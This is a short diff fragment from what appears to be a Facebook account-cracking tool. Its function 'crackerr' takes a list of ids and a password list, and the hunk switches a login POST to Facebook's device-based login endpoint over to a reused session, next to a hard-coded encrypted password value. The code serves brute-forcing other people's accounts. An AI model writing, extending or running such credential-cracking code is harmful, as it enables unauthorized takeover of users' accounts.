@@ -554,7 +554,7 @@ def crackerr(ids,passlist):
     'encpass': '#PWD_BROWSER:5:1761817301:AYxQALT5eVLOXX8kNiZGrwV2U50ClqDxfSQDZfnfpjbnFT5wjKXGZwUcwsDMErKcet0GTQBt0PSEvKvavi1pX/fn/1albUSEhYwlyuNVtUPoMXbmsOg54XY9JJ8a1h+PIQkS3budWuOoTw==',
 }
 
-            response = requests.post(
+            response = session.post(
                 'https://www.facebook.com/login/device-based/regular/login/',
                 params=params,
                 cookies=cookies,
